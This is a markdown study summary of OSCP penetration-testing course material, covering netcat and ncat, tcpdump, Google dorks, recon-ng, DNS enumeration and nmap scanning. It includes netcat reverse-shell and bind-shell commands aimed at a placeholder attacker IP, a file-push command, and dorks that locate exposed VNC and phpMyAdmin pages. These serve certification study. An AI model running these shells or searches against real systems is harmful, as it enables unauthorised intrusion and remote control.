# OSCP
Summary of the OSCP course material.
See "OSCP-Cheatsheet" for lab/exam specific cheatsheet.

# Index

- [Introduction](#introduction) 

# Content

### ============================================================
### Introduction
### ============================================================


### ============================================================
### Essential Tools
### ============================================================

**Netcat**  
Basics
```bash
nc -nlvp [port]          # set up listener
nc -nv [IP] [port]       # banner grabbing OR connect to remote port
```
File Transfer
```bash
nc -nlvp [port] > incoming.exe          # VIC: set up listener, direct data to incoming.exe
nc -nv [IP] [port] < /path/to/wget.exe  # ATT: push wget.exe file to VIC
```
Bind Shell: bind executable (e.g. cmd.exe) to a local port (typically victim machine)
```bash
nc -nlvp [port] -e cmd.exe  # VIC: set up listener + bind cmd.exe to local port
nc -nv [VIC IP] [port]   # ATT: attacker connects and is presented with cmd prompt
```
Reverse Shell: victim box connect to attacker box
```bash
nc -nvlp [port]                       # ATT: attacker set up listener
nc -nv [ATT IP] [port] -e /bin/bash   # VIC: attacker sends reverse shell to their box
```

**Ncat**  
Ncat is an improved version of the Netcat tool, with SSL encryption + ability to whitelist access to specific IP's.

Secure Bind Shell:
```bash
ncat -lvp 4444 -e cmd.exe --allow [IP] --ssl   # Box A: set up listener, allow on connections from only IP, SSL-encrypted.
ncat -v 10.11.14.143 4444 --ssl                # Box B: connect to Box A, SSL-encrypted.
```

**Tcpdump**

Analyse traffic from file (.pcap etc.) + show data in hex and ASCII
```bash
tcpdump -nX -r filename.pcap
```

Analyse and filter traffic:
```bash
tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap   # src filter
tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap   # dest filter
tcpdump -n port 81 -r password_cracking_filtered.pcap                 # port filter
```


### ============================================================
### Passive Info Gathering
### ============================================================

**Google Hacking**

More with Google Hacking Database https://www.exploit-db.com/google-hacking-database/

```bash
site:"microsoft.com" -site:"www.microsoft.com"            # list subdomains of Microsoft.com
site:"microsoft.com" filetype:ppt "penetration testing"   # list .ppt files with term "penetration testing"
intitle:"VNC viewer for Java"                             # list pages with a open VNC access pages
inurl:"/control/userimage.html"                           # list pages which contain file "/control/userimage.html"
inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin # list pages with post-authenticated db admin page.
```

**Recon-ng**

Basic usage:
```bash
recon-ng                                # access recon-ng
use recon/path/to/module                # use module
set SOURCE uber.com                     # set source target
run                                     # run module
```

Some useful modules:
```bash
recon/domains-contacts/whois_pocs       # find employee names and email addresses
recon/domains-vulnerabilies/xssed       # find existing XSS vulnerabilities
recon/domains-hosts/google_site_web     # find subdomains via. Google search
```

### ============================================================
### Active Info Gathering
### ============================================================

**DNS Enumeration**

Forward DNS lookup:
```bash
for name in $(cat list.txt); do
    host $name.megacorp.com | grep 'has address' | cut -d" " -f1,4
done
```

Reverse DNS lookup:
```bash
for ip in $(seq 72 91); do
    host 38.100.193.$ip | grep 'megacorp' | cut -d" " -f1,5
done
```

Zone transfers: "database replication" between related DNS servers / copy the list of all dns names configured for one zone to a secondary DNS server
```bash
# For each nameserver of an input domain, perform a zone transfer
for server in $(host -t ns $1 | cut -d" " -f4); do
    host -l $1 server | grep 'has address'
done
```

**Port Scanning**

Three types of scans:
1. TCP Connect: attempts to complete a 3-way handshake with the target.
2. Stealth/SYN: sending only SYN packets without completing the 3-way handshake.
3. UDP: empty UDP packet is sent to the target. No response = open. ICMP port unreachable response = closed.

Port scanning pitfalls:
* UDP scanning is unreliable. Firewalls/routers drop ICMP packets, leading to false positives saying UDP port is OPEN.
* Don't forget to scan for UDP services.

Nmap scanning:
```bash
nmap -sn 10.11.1.1-254                   # network sweep: identify live hosts in a network
nmap -p 80 10.11.1.1-254                 # network sweep: identify hosts with OPEN port 80
nmap -sT -A --top-ports=20 10.11.1.1-254 # network sweep: identify hosts with OPEN top 20 ports

nmap -O 10.0.0.19                        # OS fingerprinting
nmap -sV -sT 10.0.0.19                   # Service enumeration / banner grabbing

nmap 10.0.0.19 --script smb-os-discovery.nse                # Connect to SMB service on a target + determine OS version
nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com   # Perform a DNS zone transfer
```






